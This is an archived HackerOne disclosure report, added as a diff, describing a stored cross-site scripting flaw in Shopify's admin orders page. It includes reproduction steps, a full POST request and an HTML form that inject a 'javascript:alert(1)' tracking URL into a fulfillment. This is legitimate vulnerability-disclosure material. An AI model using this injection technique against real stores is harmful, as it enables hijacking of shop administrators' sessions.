@@ -1,0 +1,50 @@
+ReportLink:https://hackerone.com/reports/106897
+WeaknessName:Cross-site Scripting (XSS) - Generic
+Reporter:https://hackerone.com/zombiehelp54
+ReportedTo:Shopify(shopify)
+BountyAmount:500.0
+Severity:
+State:Closed
+DateOfDisclosure:17.02.2016 5:14:22
+
+Summary:
+
+Hi , I have found a Stored XSS vulnerability in orders page.
+#Steps to reproduce:
+1. Create a new order with an item that requires shipping 
+2. Go to `https://<store>.myshopify.com/admin/orders/<order_id>`
+3. Click the **Fulfill items** button then fulfill the items
+4. Now a new fulfillment with an id will be generated , get the id of the fulfillment and send the following post request:
+
+```
+POST https://<your-store>.myshopify.com/admin/orders/<order-id>/fulfillments/<fulfillment-id>
+Accept:text/html, application/xhtml+xml, application/xml
+Accept-Encoding:gzip, deflate
+Accept-Language:en-US,en;q=0.8
+Connection:keep-alive
+Content-Length:380
+Content-Type:application/x-www-form-urlencoded; charset=UTF-8
+Cookie: <cookies>
+X-CSRF Token: <YOUR_TOKEN>
+X-Requested-With:XMLHttpRequest
+....
+
+utf8=%E2%9C%93&_method=put&authenticity_token=<CSRF_TOKEN>&fulfillment%5Btracking_numbers%5D%5B%5D=TrackingNumber&fulfillment%5Btracking_urls%5D%5B%5D=javascript%3Aalert(1)%3B%2F%2F&fulfillment%5Btracking_company%5D=Other&fulfillment%5Bnotify_customer%5D=false&fulfillment%5Bnotify_customer%5D=true
+```
+
+5.- The fulfillment will be updated , go to the order page then scroll down and click on **Successfully processed a payment** then click the link that says **TrackingNumber** and XSS will trigger.
+
+#Example Form (in case you are having trouble sending the request):
+```html
+<form action="/admin/orders/1917753154/fulfillments/1542021826" accept-charset="UTF-8" method="post">
+<input name="utf8" type="hidden" value="✓">
+<input type="hidden" name="_method" value="put">
+<input type="hidden" name="authenticity_token" value="<CSRF_TOKEN>">
+<input name="fulfillment[tracking_urls][]" value="javascript:alert(1);//">
+<input type="text" name="fulfillment[tracking_numbers][]" value="TrackingNumber">
+<input name="fulfillment[tracking_company]" value="other">
+<input type="hidden" name="fulfillment[notify_customer]"  value="true">
+ <input type="submit">                    
+</form>
+```
+Thanks
